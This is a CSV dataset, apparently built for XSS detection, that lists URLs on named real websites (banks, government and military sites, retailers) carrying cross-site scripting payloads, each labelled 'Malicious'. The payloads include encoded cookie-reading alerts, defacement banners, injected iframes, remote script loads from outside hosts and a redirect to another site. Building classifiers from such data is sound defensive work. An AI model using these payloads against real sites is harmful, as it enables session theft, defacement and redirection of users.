Payloads,Class
"http://partnernet.avira.com/en/partner-locator/europe?country='&quot;--&gt;&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(st<br>ring.fromcharcode(66,101,115,116,32,114,101,103,97,114,100,115,32,102,114,111,109,32,66,117,108,103,<br>97,114,105,97))&lt;/script&gt;&lt;script src=http://ckers.org/s&gt;",Malicious
http://www.enzyte-male-enhancement.com/google/?microppcsite=google&amp;microppcterm=%22%3e%3cmarquee%3e%<br>3ch1%3ebob_just_wants_your_money.%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
"http://www.nvidia.com/download/index.aspx?lang=""><script>prompt(/xss/)</script>",Malicious
http://images.jsc.nasa.gov/search/search.cgi?textsearch=go&amp;hitsperpage=5&amp;submit.x=7&amp;submit.y=8&amp;submi<br>t=submit&amp;keywords=%3cscript%3ealert%28%22xroot+rulezzz%22%29%3b+document.write%28%22%3cbr%3e+%3cbr%3<br>enasa%20sux%20=]%21+%3cbr%3e+%3cbr%3e%3cbr%3e+%3cbr%3e%3cbr%3e+%3cbr%3e%3cbr%3e+%3cbr%3e+%22%29%3c%2<br>fscript%3e%3c%2fb%3e%3cp%3exroot%20group%3c%2fp%3e,Malicious
http://www.onlinegamesforum.com/games.php?id=%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
https://bankingportal.sparkasse-guetersloh.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google<br>.de%3e,Malicious
http://www.domesticinstallations.co.uk/portfolio/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.booking.com/searchresults.html?return_url=http%3a%2f%2fwww.booking.com%2fsearchresults.ht<br>ml&amp;found_addresses=&amp;error_url=http%3a%2f%2fwww.booking.com%2findex.html%3fsid%3dd3dd21249d0752af74b7<br>311c60599c77%3b&amp;sid=d3dd21249d0752af74b7311c60599c77&amp;si=ai%2cco%2cci%2cre&amp;ss=hola%22%2f%3e%3cscript%<br>3ealert%28%27xss%27%29%3c%2fscript%3e&amp;checkin_monthday=16&amp;checkin_year_month=2008-4&amp;checkout_monthda<br>y=17&amp;checkout_year_month=2008-4&amp;do_availability_check=on,Malicious
http://lgames.sourceforge.net/index.php?project=%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://tag.mmosite.com/search.php?q=%22%3e%3cscript%3ealert%28%2fxss%2f%29%3c%2fscript%3e&button=+,Malicious
http://ratemyserver.net/index.php?iname=%22%3e%3cmarquee%3e%3ch1%3edefaced+by+iron&amp;page=item_db&amp;isea<br>rch=search&amp;itype=-1,Malicious
http://www.praeplan.de/art/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;bac<br>kdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.winchellswebworks.com/andorc/i-gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://nullpo.2log.net/editor/publog.php?lv=thread&amp;mod=blog&amp;cmd=comment&amp;trans=start&amp;project_cd=labo&amp;<br>thread_id=img&amp;entry_id=20070713163017%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso%2ecom%2fxss<br>%2ejs%3e%3c%2fscript%3e,Malicious
http://www.ippt.gov.pl/~mstan/tests/test.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%<br>3e,Malicious
http://mail.rad.gov.tw/phpinfo.php?a[]=%3e%3cscript%3ealert(/kabus/);%3c/script%3e,Malicious
http://java.freenode.net//index.php?channel=%22%3e%3cscript%3ejavascript:alert(document.domain)%3c/s<br>cript%3e,Malicious
http://www.dcmnr.gov.ie/search/search.htm?st=%3c%2fscript%3e%3cscript%3ealert%28%22noph0bia%22%29%3c<br>%2fscript%3e,Malicious
http://www.kpk.gov.pl/search%3cimg%20src=%3e%22%3e%3cscript%20%3ealert(1337);%3c/script%3e,Malicious
http://www.no-fortaleza-europa.eu/showpage.jsp?id='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e<br>%3cmarquee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://www.vesta.net/es/products.php?page=3%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e<br>&amp;amp;id=,Malicious
http://www.dreamsmagazine.net/index.php?month=1&amp;day=&amp;year=2007%22%3e%3ch1%3eby%20st@rext%3c/h1%3e%3c<br>script%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.asap-utilities.com/asap-utilities-excel-tools-tip.php?tip=7&amp;utilities=select%27%22%3e%3c/<br>title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/m<br>arquee%3e,Malicious
http://losangeles.metromix.com/search/results?keywords=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fs<br>cript%3e%22%27,Malicious
http://www.hellnewer.com/coklukayit/?d=8%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
https://support.tenablesecurity.com/support-center/index.php?x=&amp;forgot_email=%22%3e%3cscript%3ealert<br>(document.cookie)%3c/script%3e&amp;form_submit=forgot_email&amp;mod_id=6,Malicious
http://www.0d4y.us/coklukayit/?d=8%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.1und1.de/index.php?msid=ac1704c1a1ycr2url4gjzn8jtoucovwp&amp;%22%3e%3cscript%3ealert(%22xss%2<br>2)%3c/script%3epage=search,Malicious
http://www.kanald.com.tr/uyelik/bilgi.asp?strmes=&lt;script&gt;alert(&quot;scriptorium(turkey)<br>hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://www.iddaa.com/iddaacom/haberall/default.asp?id=t2b%22%3e%3cscript%3ealert(%22daimon%22)%3c/sc<br>ript%3e,Malicious
http://docbweb.ispa.pt/docbweb/plinkres.asp?base=isbd&amp;form=&amp;startrec=0&amp;recpag=5&amp;newsearch=1&amp;searchtx<br>t=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.landing.rewardzonemastercard.com/media/disclosure?cmd_lpage=&amp;indicator=rz002&amp;media=b1ag03<br>0aa_t97}&quot;&gt;&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;,Malicious
https://bankingportal.sparkasse-paderborn.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google.<br>de%3e,Malicious
http://www1.ntv.co.jp/mobile/weblog/oha4/index.cgi?id=21&amp;mode=individual&amp;no=8'%3e%22%3e%3cscript/src<br>=http://kusomiso.com/xss.js%3e%3c/script%3e&amp;eid=2178,Malicious
http://www.marijkepcoh.nl/album/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.toolboxrecords.com/fr/search//""><script>alert('xss+by+atm0n3r')</script>",Malicious
http://www.eurosinosourcing.com.cn/spip.php?action=cookie&amp;url=java:%22/%3cscript%3ealert('hello%20th<br>e%20rat')%3c/script%3e,Malicious
http://forums.digiguide.com/forum.asp?id=32&quot;&gt;http://www.cidghana.org/forum/skapainlagg.asp?id=0&quot;&gt;&lt;sc<br>ript&gt;alert('xss')&lt;/script&gt; &lt;- adding a vulnerable url activates an xss flaw poc,Malicious
http://webhome.cs.uvic.ca/~gtzan/music.html%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e<br>%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.dieplattelebt.de/rockindablock/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.ghanacedi.gov.gh/index1.php?linkid=%22%3e%3cscript%3ealert(/xssed/);%3c/script%3e,Malicious
"http://www.themexp.org/listings.php?type=boot&amp;view=&amp;proddesc=xp%20boot%20screens%22%3e'%3e%3cscript%<br>3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://apache5.com/m/index.cgi?id=2&amp;mode=individual&amp;no=14&amp;eid=374%22%3e'%3e%3cscript%3ealert('x')%3c<br>/script%3e,Malicious
http://ask.jp/image.asp?o=%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2866%2c121%2c32%2c107%<br>2c117%2c115%2c111%2c109%2c105%2c115%2c111%2c46%2c99%2c111%2c109%29%29%3c%2fscript%3e%0d%0a&amp;qsrc=4&amp;q=<br>link%3ahttp%3a%2f%2fwww.youtube.com%2fwatch%3fv%3dqvsgrwqgvl0&amp;ln=ja&amp;ps=&amp;btnimg.x=39&amp;btnimg.y=14,Malicious
http://www.rgz.sr.gov.yu/docf/default.asp?login=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ft<br>extarea%3e%3cscript%3ealert%28%22kaksii_was_here%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29%3<br>balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3c<br>div%2520align%3dcenter%3e%2520%3cfont%2520size%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d100000%2520<br>rows%3d10000%2520id%3d1%3ekaksii%2520was%2520here%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscri<br>pt%3e%3cplaintext%3e%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%<br>28%22kaksii_was_here%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e<br>%22%3c%2fhtml%3e%3chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%25<br>20%3cfont%2520size%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3eka<br>ksii%2520was%2520here%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;passwor<br>d=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was_he<br>re%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3<br>chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size<br>%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3ekaksii%2520was%2520h<br>ere%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;btlogin=login,Malicious
http://www.bailamos.it/public/i-gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.makinabazaar.com/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://minashot.net/cgi-bin/cm_fda78915da456/aw96zdq5147s.cgi?mode=change&amp;no=162'%3e%22%3e'%3e%3cscr<br>ipt%3ealert(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious
http://www.physiotherapist.net.au/physio_classifieds/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert<br>(backdoor)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.villa-liebetrau.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://register.go.com/go/login?membername=%22%3e%3cscript%3ealert(%22i-landet%22)%3c/script%3e,Malicious
http://www.zjwsw.gov.cn/acceptjob.asp?job=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://www.saneeks.com/search.php?type=&amp;page=4&amp;start=31&amp;query=%22%3e%27%3e%3cscript%3ealert(123)%3c/<br>script%3e,Malicious
http://www.unspsc.org/search.asp?css='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee%3e<br>whitehat%20forever%3c/marque%3e,Malicious
http://web5.kariyer.net/teknikdestek/sifremi_unuttum.kariyer?arn=&amp;sid=%22%3e%3cscript%3ealert(%22ula<br>n+ne+tenekesiniz%22)%3c/script%3e,Malicious
http://yamagata.int21h.jp/d/?year=2006'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/scrip<br>t%3e;month=1h;category=o,Malicious
http://www.bobigny.fr/jsp/site/portal.jsp?page=search&amp;query=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert<br>(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;items_per_pag<br>e=5,Malicious
http://www.amazon.com/s/ref=amb_link_7581132_5/102-9803838-3100108?ie=utf8&amp;node=&quot;/&gt;&lt;script&gt;alert(&quot;xs<br>s&quot;);&lt;/script&gt;&amp;keywords=lips&amp;emi=a19zeoaokuup0q&amp;pf_rd_m=atvpdkikx0der&amp;pf_rd_s=left-1&amp;pf_rd_r=1jmp73jg<br>1c2f3qdq0d07&amp;pf_rd_t=201&amp;pf_rd_p=442850401&amp;pf_rd_i=0312217862,Malicious
http://ms148.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
https://bankingportal.sparkasse-schwerte.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google.d<br>e%3e,Malicious
http://google.sina.com.hk/cgi-bin/google_images.cgi?word=%a7%f5%b7%c7%b0%f2%22%3e'%3e%3cscript%3eale<br>rt('x')%3c/script%3e,Malicious
http://www.universaltelecominc.com/existingretailagent/login.asp?error=a&quot;;&lt;/script&gt;&lt;script&gt;alert('by<br>+panzerturk');&lt;/script&gt;,Malicious
http://www.plugger.com.au/index.asp?q=%22%3e%3cbody+onload=alert(%22by%20encore%22)%3e%3cmarquee%3e%<br>3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3e,Malicious
http://help.avm.de/fritzbox.php?devicefeatures=%22%3e%3ciframe%20src=http://xssed.com%3e,Malicious
http://www.agapea.com/buscar/buscador.php?idc=&amp;texto=%22%3e%3ch1%3exss%3cscript%3ealert(1)%3c/script<br>%3e&amp;x=0&amp;y=0,Malicious
http://newsline.depaul.edu/search.asp?text=%22%3cscript+src%3dhttp://vuln.xssed.net/thirdparty/scrip<br>ts/hotpockets.js%3e,Malicious
https://qualysevents.webex.com/ec0509l/eventcenter/recording/recordaction.do?theaction=archive&amp;siteu<br>rl=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;hacked%20by%20trex&lt;/h1&gt;,Malicious
http://www.pineisland.com/photogallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.pakistans.com/webranker/index.php?url=%3cmarquee%3e%3cp%3e%3cfont+size%3d%227%22%3epwned+<br>by+hacking-gurus.com+%21%21%21%21%21%21%21%21%21%21%21%21%21%21%26nbsp%3b+neo+%3d+dont+mess+with+us%<br>3c%2ffont%3e%3c%2fp%3e%22%3e%3cscript%3ealert%28%5c%5c,Malicious
http://www.congress.gov.ph/audience/index.php?users=%3cbody%20onload=alert(/xss/)%3e,Malicious
http://www.xuecheng.gov.cn/artcontent.asp?artid=3768%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/<br>script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.mymodeltalk.com/jobs/modeling-acting-auditions-new-york-new-jersey/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;sc<br>ript&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www2.dgeep.mtss.gov.pt/docbweb/thres.asp?base=isbd&amp;searchterm=&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.blide.org/index.php?section=%3cscript%3ealert(/xssed%20by%20dr.optix.%20why?%20because%20<br>i%20can!/)%3c/script%3e,Malicious
http://www.nato-pa.int/default.asp?cat2=0&amp;cat1=0&amp;cat0=0&amp;com=0&amp;mod=0&amp;smd=0&amp;ssmd=0&amp;sta=0&amp;id=0&amp;par=&gt;&quot;&gt;&lt;<br>script%20%0a%0d&gt;alert('cyber//www.warattack.org')%3b&lt;/script&gt;&amp;lng=0,Malicious
http://www.ludingtondailynews.com/news.php?story_id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ncbolabs-dev1.stanford.edu:8080/parsetrees/execute.jsp?query=%22%3e%3cbody%20background=%22ht<br>tp://www.lenagold.ru/fon/eda/shoko/shoko14.gif%22%3e%3cscript%3ealert%28%22hmm..chocolate.%20xss%20b<br>y%20sony%22%29%3c/script%3e%3ciframe%20width=%22520%22%20height=%22415%22%20src=%22http://www.youtub<br>e.com/embed/5c24grhhfy0%22%20frameborder=%220%22%20allowfullscreen%3e%3c/iframe%3e&amp;type=string,Malicious
http://yp.eastvalleytribune.com/common+root+herbal+medicine+--26+acupuncture.9.66500694p.home.html%2<br>7%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c<br>/h1%3e%3c/marquee%3e,Malicious
http://atwork.nypost.com/careers/jobsearch/results?kandentire=%22%3e%3cscript%3ealert%28%22maxwel%22<br>%29%3c%2fscript%3e&amp;categorieslist1%5b0%5d=&amp;fromsearch_x=35&amp;fromsearch_y=5,Malicious
http://www.arcticnet.ulaval.ca/index.php?fa=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
https://stores.musictoday.com/store/shopper_lookup.asp?band_id=433&amp;sfid=2&amp;target=%22%3e%3cbody/onloa<br>d=alert(/xss/)%3e,Malicious
http://www.888.com/new888/home.htm?page=gettingstarted&amp;lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;,Malicious
http://web.njcu.edu/its/photogallery/reslife/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.hediyeplaystation.com/aciklama.php?id=878%22%3e%3cscript%3ealert(/size%20g%fczel%20bi%fee<br>y%20hediye%20ederim/)%3c/script%3e,Malicious
http://dodvclips.mil/index.jsp?auto_band=x&amp;rf=sv&amp;fr_story=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.zelo.com/firstnames/findresults.asp?name=%3c%2ftitle%3e%3ch1%3e%3cmarquee%3exssed.com&amp;sub<br>mit2=find+it,Malicious
http://m.gavsta.com/html/index_done.php?url=&lt;script&gt;alert(1);&lt;/script&gt;&amp;short_url=&lt;script&gt;alert(1);&lt;/<br>script&gt;,Malicious
http://sousuo.mofcom.gov.cn/query/englishquerysearch.jsp?pageno=&amp;p_keyword=%22%3e%3cscript%3ealert%2<br>81%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was_here%22%29%3cscript%3ealert%2<br>8%27kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%3cscript%3ealert%2<br>810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size%3d4%3e%3ctextarea%2520name<br>%3d1%2520cols%3d1000%2520rows%3d1000%2520id%3d1%3ekaksii%2520was%2520here%3c%2ftextarea%3e%3c%2ffont<br>%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e,Malicious
http://coditel.lu/index.php?page=%22/%3e%3cscript%3ealert(1);%3c/script%3e&amp;id=speedclick,Malicious
https://admin.testandtarget.omniture.com/forgotpassword?email=%22%3e%3cscript%3ealert%28document.coo<br>kie%29%3c/script%3e,Malicious
http://oeidrus.jalisco.gob.mx/servicios/libre.asp?id=%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
http://www.skype.bj.cn/search.php?searchword=%22%3e%3cscript%3ealert%28/xss/%29%3c/script%3e&searchtype=&submit.x=37&submit.y=5,Malicious
http://www.skcb.cz/soupiska_nova.asp?kategorie='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3c<br>marquee%3ewhitehat%20forever%3c/marquee%3e&amp;sezona='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e<br>%3cmarquee%3ewhitehat%20forever%3c/marquee%3e,Malicious
http://www.shufuni.com/search?q=%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
http://www.pirateaccess.com/signup.php?data=1z0kuga7h-8489-mmjwydk3xe&amp;t='%3e%22%3e%3cimg%20src=no_su<br>ch_icon%20onerror=alert(document.cookie);%3e%3cmarquee%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e%3c/marqu<br>ee%3e,Malicious
http://www.patternworks.com/pwshopping/deptpage.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/scri<br>pt&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://www.cafre.ac.uk/search.jsp/search.lsim?ha=%27%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://theprojecty.net/tt/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69<br>%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%<br>32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2<br>c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://www.cne.gov.co/cne/index.jsp?option=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://help.register.it/faq/search.html?operator=or&amp;searchtext=%27%3cscript%3ealert(document.cookie)<br>%3c/script%3e,Malicious
http://www.hackbulten.com/?month=3&amp;day=9&amp;year=2007%22%3e%3cstyle%3ebody{background-color:black;color<br>:white;font:50px%20arial;}%3c/style%3e%3ch1%3eby%20st@rext%3e%3cmarquee%3ewhitehat+forever+by%20st@r<br>ext%3c%2f%3cscript%3ealert(document.cookie)%3c/script%3e%3cbody%20onload=alert(/xssed/)%3e,Malicious
"https://services.acceleration.biz/listservice/listservice.aspx?ck=aaa008184&amp;redirecturl=http://www.k<br>usomiso.com&amp;emailaddr=noreply@skype.net&amp;name=%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,8<br>3,32,66,121,32,107,117,115,111,109,105,115,111,46,111,1&amp;skypename=&amp;customtext=skype%82%cd%96%b3%97%b<br>f%82%c5%81a%83_%83e%83%93%83%8d%81[%83h%82%c6%83c%83%93%83x%83g%81[%83%8b%82%e0%8a%c8%92p%82%c5%82%b<br>7%81b%83c%83%93%83x%83g%81[%83%8b%82%b7%82%ea%82%ce%81a%8e%84%82%e2%91%bc%82%ccskype%83%86%81[%83u%8<br>2%c9%96%b3%97%bf%82%c5%93d%98b%82%c5%82%ab%82%dc%82%b7%81b&amp;msgname=wtaf_ja_jp_v1&amp;friendemailaddr=&amp;fr<br>iendname=&amp;friendemailaddr=&amp;friendname=&amp;friendemailaddr=&amp;friendname=&amp;friendemailaddr=&amp;friendname=&amp;sha<br>re_send=%91%97%90m%82%b7%82%e9",Malicious
http://so.tv.sohu.com/mts?chl=&amp;c=2&amp;whole=1&amp;o=1&amp;cat=&amp;area=&amp;year=-1&amp;cs=&amp;age=%27%22%3e%3cscript%3ealert<br>%28%22securitylab.ir%22%29;%3c/script%3e,Malicious
http://travel.nikkansports.com/theme_tour.html?cateid=192&amp;level=1&amp;tourc=w%22%3e%27%3e%3c%73%63%72%69<br>%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%<br>32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2<br>c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.yaronet.com/forum.php?s=39%27%22%3e%3cimg%20src=k.png%20onerror=alert(/xss/.source)%20/%3<br>e,Malicious
https://bankingportal.sparkasse-werra-meissner.de/banking/?konto=%22%3e%3ciframe%20src=http://www.go<br>ogle.de%3e,Malicious
http://www.usno.navy.mil/cgi-bin/search.cgi?q=%22%3e%3cscript%3ealert%28%27xylitol+was+here%21%27%29<br>%3b%3c%2fscript%3e&amp;ps=10&amp;o=0&amp;m=all&amp;t=,Malicious
http://www.globes.co.il/serve/globes/docview.asp?did=1000296591&amp;fid=%22%3e%3cscript%3ealert(document<br>.cookie)%3c/script%3e%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
https://fs.ogm.utah.gov/pub/oil&amp;gas/newyork/utahrbdmsweb/phpinfo.php?a[]=%22%3e%3cscript%3ealert(doc<br>ument.cookie)%3c/script%3e,Malicious
http://usedcollegecars.com/signinform.php?msg=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28<br>%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%<br>2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%3<br>9%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.addthis.com/bookmark.php?pub=&amp;url=c%00%22%22%3cscript%3ealert(321);%3c/script%3e&amp;title=xs<br>sed.com,Malicious
https://www.justdrinkgifts.co.uk/shop/search.asp?q=%3ciframe%20src=javascript:alert(123)%3e,Malicious
